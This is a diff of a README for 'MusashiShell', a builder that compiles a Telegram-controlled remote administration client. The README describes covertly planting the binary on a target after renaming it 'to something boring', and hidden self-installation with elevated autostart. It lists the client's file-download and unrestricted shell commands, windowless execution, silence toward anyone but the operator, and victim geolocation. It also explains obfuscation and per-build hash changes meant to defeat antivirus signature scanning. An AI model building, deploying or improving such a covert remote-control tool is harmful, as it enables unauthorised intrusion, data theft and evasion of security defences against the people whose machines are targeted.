@@ -1,3 +1,4 @@
+```markdown
 # MusashiShell
 
 Telegram-controlled remote administration client + binary builder. Configure once, get a self-installing `.exe` that reports back to your Telegram and accepts shell commands.
@@ -8,7 +9,7 @@ Telegram-controlled remote administration client + binary builder. Configure onc
 
 ## What it is
 
-- **Builder** (`builder.py`) — interactive CLI. Takes a bot token, admin ID, and client name; generates and compiles a single-file binary.
+- **Builder** (`builder.py`) — interactive CLI. Takes a bot token, admin ID, client name and app name; generates and compiles a single-file binary.
 - **Template** (`resources/template.py`) — the client itself. Self-installs into a hidden folder, registers in OS autostart (elevated if possible), connects to Telegram, runs shell commands from a single admin.
 
 **Target OS support:** Windows, Linux, macOS.
@@ -19,7 +20,7 @@ Telegram-controlled remote administration client + binary builder. Configure onc
 
 **Build machine:**
 ```bash
-pip install rich pyinstaller aiogram
+pip install -r requirements.txt
 ```
 
 **Target machine:** nothing. The binary is self-contained.
@@ -40,9 +41,10 @@ pip install -r requirements.txt
 python builder.py
 
 # 3. Choose [1], enter:
-#    - Bot token  (from @BotFather)
-#    - Admin ID   (your numeric ID from @userinfobot)
+#    - Bot token   (from @BotFather)
+#    - Admin ID    (your numeric ID from @userinfobot)
 #    - Client name (e.g. "BOT Charlie")
+#    - App name    (exe / task / registry / unit, default: SystemEvents)
 
 # 4. Wait ~2-3 min. Binary appears at:
 #    build/<slug>/dist/<slug>_obf.exe
@@ -50,7 +52,8 @@ python builder.py
 # 5. Rename it to something boring, copy to target, run.
 #    Telegram will receive "🟢 [NAME] ONLINE!"
 
-# NOTE!!! After creating the bot token, send the bot a `/start` message to allow it to message you.
+# NOTE!!! After creating the bot token, send the bot a `/start` message
+#         to allow it to message you.
 ```
 
 ---
@@ -76,18 +79,23 @@ Config is saved in `cfg/builder.conf`. Logs rotate in `logs/builder.log`.
 
 | Command | Action |
 |---|---|
-| `/start` | Host info: OS, user, IPs, MAC, admin status |
+| `/start` | Host info + geolocation |
 | `/help` | Command list |
 | `/heartbeat` | Liveness: uptime, PID, offline flag |
 | `/getfile <path>` | Download a file from target (≤ 50 MB) |
 | `/putfile <dir>` | Upload a file from Telegram into `<dir>` |
-| *any text* | Shell command (60 s timeout, output chunked at 4000 chars) |
+| `/cmd <command>` | Run via `cmd.exe /c` (Win) or `sh` (Unix) |
+| `/powershell <command>` | Run via PowerShell (Windows only) |
+| `/uninstall` | Self-destruct with inline confirmation |
+| *any text* | Shell command (no timeout, output chunked at 4000 chars) |
 
 Examples:
 ```
 dir
 ps aux | head -20
 netstat -an | findstr LISTEN
+/cmd whoami /priv
+/powershell Get-Process | Select -First 5
 ```
 
 ---
@@ -102,9 +110,9 @@ netstat -an | findstr LISTEN
 
 On Windows, folder and file get `HIDDEN + SYSTEM` attributes.
 
-**Install marker** (prevents duplicate copies):
-- Windows: `HKCU\Software\WinSvcIMTx32\LaunchPath`
-- Unix: `~/.config/WinSvcIMTx32/install_path`
+**Install marker** (prevents duplicate copies; uses APP_NAME, default `SystemEvents`):
+- Windows: `HKCU\Software\<APP_NAME>\LaunchPath`
+- Unix: `~/.config/<APP_NAME>/install_path`
 
 ---
 
@@ -119,32 +127,79 @@ On Windows, folder and file get `HIDDEN + SYSTEM` attributes.
 
 ## Uninstall
 
-Kill the process first:
+Two ways: manual (below) or via Telegram — send `/uninstall`, confirm with inline **Yes**, and the client removes itself and exits.
+
+Manual removal, kill the process first:
 ```
-taskkill /F /IM WinSvcIMTx32.exe /T
+taskkill /F /IM <APP_NAME>.exe /T
 ```
 
-**Windows (elevated):**
+**Windows (elevated)** — replace `<APP_NAME>` with your app name (default `SystemEvents`):
 ```
-schtasks /Delete /TN WinSvcIMTx32 /F
-reg delete "HKCU\Software\WinSvcIMTx32" /f
-reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WinSvcIMTx32 /f
+schtasks /Delete /TN <APP_NAME> /F
+reg delete "HKCU\Software\<APP_NAME>" /f
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v <APP_NAME> /f
 ```
 
 **Linux (root):**
 ```bash
-systemctl disable --now WinSvcIMTx32.service
-rm -f /etc/systemd/system/WinSvcIMTx32.service
+systemctl disable --now <APP_NAME>.service
+rm -f /etc/systemd/system/<APP_NAME>.service
 rm -rf /opt/.<rand>
-rm -f ~/.config/WinSvcIMTx32/install_path
+rm -f ~/.config/<APP_NAME>/install_path
 ```
 
 **macOS (root):**
 ```bash
-launchctl unload -w /Library/LaunchDaemons/com.WinSvcIMTx32.plist
-rm -f /Library/LaunchDaemons/com.WinSvcIMTx32.plist
+launchctl unload -w /Library/LaunchDaemons/com.<APP_NAME>.plist
+rm -f /Library/LaunchDaemons/com.<APP_NAME>.plist
 rm -rf "/Library/Application Support/.<rand>"
 ```
+
+---
+
+## Directory layout
+
+```
+MusashiShell/
+├── builder.py              # interactive builder
+├── pyproject.toml
+├── requirements.txt
+├── README.md
+├── LICENSE
+├── resources/
+│   ├── template.py         # client source with __PLACEHOLDERS__
+│   └── app.ico             # optional Windows icon
+├── cfg/
+│   └── builder.conf        # auto-created; last used config
+├── logs/
+│   └── builder.log         # auto-created; rotating, 5×5 MB
+└── build/
+    └── <slug>/
+        ├── client.py       # substituted source
+        ├── client_obf.py   # obfuscated (single line)
+        ├── dist/
+        │   └── <slug>_obf.exe
+        ├── work/
+        └── .sig_obf.json   # cache signature
+```
+
+`<slug>` is derived from the client name: spaces → `_`, non-alphanumerics stripped. E.g. `BOT Charlie` → `BOT_Charlie`.
+
+---
+
+## Under the hood
+
+- **Secrets (token, admin ID) are base64-encoded** inside the generated `client.py`. This is obfuscation, not encryption — it only defeats naive grep / regex scanners looking for the `\d+:...` bot-token pattern. Anyone with the binary can decode in one line.
+- **Every build is byte-unique.** Three random letter/digit comments are injected at the top of `client.py` before obfuscation, so the payload and the final binary hash differ between builds. This defeats naive signature matching by hash.
+- **Obfuscated payload is a single line.** `client_obf.py` contains only `_=lambda __:exec(__import__('gzip')...)` — no visible imports. All module inclusions are declared via PyInstaller's `--hidden-import` and `--collect-submodules` in `builder.py`.
+- **Obfuscation layers.** gzip → lzma → zlib → base64 → reversed string. Unpacked at runtime by a lambda `exec()`.
+- **Output encoding.** `cmd.exe` built-ins write in the OEM codepage (cp866 on Russian Windows, cp437 on US, cp932 on Japanese, ...) when stdout is a pipe. The client tries UTF-8 first, then falls back to the OEM codepage. This is why `dir` output is readable text, not `????`.
+- **No console windows.** Every subprocess call on Windows uses `CREATE_NO_WINDOW`. The client is built with `--noconsole`. Nothing flashes when commands run.
+- **Connection tracking.** The client notifies the admin once on first connection loss, stays silent for subsequent failures, and sends a "back online" message (with fresh device info) when the loop survives 3 s without raising.
+- **Shutdown notifications.** `SIGINT` / `SIGTERM` / `SIGBREAK` handlers plus an `atexit` backstop send exactly one "shutting down" message per process.
+- **Stealth for strangers.** Non-admin messages get no reply at all — no "access denied", nothing. The bot silently ignores anyone but the configured admin.
+- **Geolocation cache.** Nine fallback geo-IP APIs are queried once per process; the result is cached in `_geo_cache` and reused for `/start` and every "back online" message.
 
 ---
 
@@ -155,9 +210,11 @@ rm -rf "/Library/Application Support/.<rand>"
 | No "ONLINE" in Telegram | Check token/admin ID; check internet; check AV quarantine |
 | `Token already in use` | Another instance is running — kill it |
 | Build fails on `*.pyd` `WinError 5` | Running client holds the DLL — `taskkill`, then rebuild |
-| `dir` output is `����` | Old build — current one decodes OEM codepage correctly |
+| `dir` output is `????` | Old build — current one decodes OEM codepage correctly |
 | Terminal broken after resize | Use Windows Terminal, not old cmd/conhost |
 | Duplicate copies in new folders | Install marker broken — check registry / marker file |
+| `ModuleNotFoundError: No module named 'X'` | Add `X` to the `HIDDEN` list in `builder.build_exe` and rebuild |
+| PyInstaller says `pyinstaller not found` | `pip install pyinstaller`, or add Python's Scripts dir to `PATH` |
 
 ---
 
@@ -179,3 +236,4 @@ GPL-3.0-or-later. See `LICENSE`.
 ## Legal
 
 Provided for authorized security testing, red team engagements, and administration of systems you own. No liability for misuse. If you don't have **written permission**, don't install it.
+```
